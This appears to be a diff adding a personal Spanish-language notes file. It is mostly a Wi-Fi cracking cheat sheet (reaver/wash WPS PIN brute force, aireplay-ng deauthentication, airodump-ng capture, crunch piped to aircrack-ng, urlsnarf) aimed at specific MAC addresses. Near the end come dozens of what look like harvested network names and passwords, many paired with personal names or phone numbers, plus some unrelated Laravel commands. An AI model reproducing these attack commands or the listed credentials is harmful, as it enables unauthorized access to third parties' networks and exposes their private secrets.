@@ -1,0 +1,160 @@
+airmon-ng start wlan0
+//scanner vulneravilidad de wpa
+sudo wash -i wlan0mon -p -s -n 15
+wash -i wlan0mon
+reaver -i mon0 -b 90:00:2d:23:33 -c 1 -vv
+reaver -i wlan0mon -b 90:00:2d:23:33 -c 1 -vv
+wifite -wps
+---------------------------
+airbase-ng -c 9 -e teddy -N -W 1 rausb0
+
+Donde:
+-c 9 especifica el canal
+-e teddy filtra un SSID concreto
+-N significa ataque Hirte
+-W 1 fuerza a las “beacons” a especificar WEP
+rausb0 es la interface wireless a usar
+airodump-ng -c 9 -d 00:06:62:F8:1E:2C -w cfrag wlan0
+
+crunsh 10 10 -t %%%%%%%%%% 1234567890 | aircrack-ng -w captura-01.cap -o essdd nombre
+---------------------------
+urlsnarf -p Pobre-01.cap
+---------------------------
+aircrack-ng Pobre-01.cap
+reaver -i wlan0mon -b C0:25:E9:97:45:F8  -vv -K 3
+sudo aireplay-ng -0 0 -a E4:47:B3:BB:F6:E8 -c A0:57:E3:08:E3:B1 wlan0mon
+sudo airodump-ng --bssid 34:4D:EA:63:25:14 -c 6 -w /home/nivaldo/Monitoreo/antel01 wlan0mon
+airmon-ng start wlan0
+airodump-ng wlan0mon
+-------------------------------------------
+wash -i mon0
+
+-------------------------------------------------
+vendor:AtherosC
+12345678
+gytuyfhhjjbbhbjjkjjjj 
+hggbhhhbnnnnhhh
+ceibal:monicarodrigez
+julio 35168437
+2311658079:enzo
+android_376c
+Android_376csolciti
+Android_376
+Cerpros-2.4fGHz,Hector96
+Florencia :router
+TexasCompany
+ (not associated)   2A:D2:D0:EC:DB:37  -90    0 - 1      0        3   pital riv agraria,
+TP_LIKE 0985521339,
+Hosera 15368437
+bruno 99999555
+CentroSantarosa:SantaRosa2018
+59140752==Silvana
+javier:098605667
+Bruninho: 092402119  
+Antel:MOVISTAR WIFI
+PRIME_6439
+pobre sin internet
+Sigue pobre sin interned
+contraseña123,centro electrico,manuela1 
+julio 2 46228970
+enzo:59140752
+pichuca: 1234567890
+Postos Rosul
+FRUTEIRA DOIS IRMAOS
+Feira Dois Irmaos
+------------------------------------------
+adamalvto
+plateia
+sanatoriop3
+CARDOZO5
+hospedes112
+Armazem 18
+POSTOCBCMATRIZ
+Stihl:postocbcmatriz
+chapaquenta
+sorrifacil
+postocbs
+Sorrifacil
+isolda1947
+fruteira dois
+Paulinaescotto
+wapa2psk
+eleodora
+Eleodora
+ELEODORA
+sanatorio:46234593
+Pizzaria D'olivino
+azul1917
+economico:554675391 554675391
+46309807
+tiket2223302
+46226096
+Rosana,46237586,
+46251103,elvirainternet,marianela
+30853176
+33155153
+29581730
+094286130,alberto13
+paula38138287
+paula38138287:38138287
+11144444hhhhuyurtt2
+natalia41171717
+ariana,5sjznxntoenznq18qyqj2hfm7
+Fronterisa:31121990
+antel@adsl:antel@adsl
+06061970
+4348arjd
+27101985
+
+-----------------------------------
+crunch 8 8 0123456789 -s 00000000 -e 99999999
+-----------------------------------------------------------
+composer create-project laravel/laravel curso-laravel-styde "6.*" //version de laravel
+
+composer create-project laravel/laravel curso-laravel-styde
+-----------------------------------------------
+sudo  php artisan serve
+
+//baseDatos laravel
+php artisan make:model Post -msfc
+//vinculando con base datos despues de configuracion
+php artisan migrate
+//datos falsos despues de configuracion
+php artisan migrate:refresh --seed
+//
+//creando controlador con
+php artisan make:controller CategoriesController
+//configuracion de tabla
+php artisan migrate
+php artisan make:migration create_categories_table
+//creacion de modelo
+    php artisan make:model Category 
+ //validation from form
+php artisan make:request ValidarFormularioRequest
+//Autentication
+composer require laravel/ui
+php artisan ui vue --auth
+php artisan migrate
+//middleaware
+$php artisan make:middleware AutchCheck
+//install version
+composer install --ignore-platform-reqs
+//ruta de entrada si coinside
+php artisan make:middleware EnsureTokenIsValid
+if ($request->input('token') !== 'my-secret-token') {
+            return redirect('home');
+        }
+
+        return $next($request);
+//
+
+php artisan migrate:fresh->elimina todas las tabla y crea un nuevo contenido
+
+php artisan make:seeder CursoLaravel
+php artisan make:factory CursoFartory
+php artisan tinker
+--------------------------------------------------
+AndroidShare_3054
+bibiana:26497613
+Antelrz6yU
+
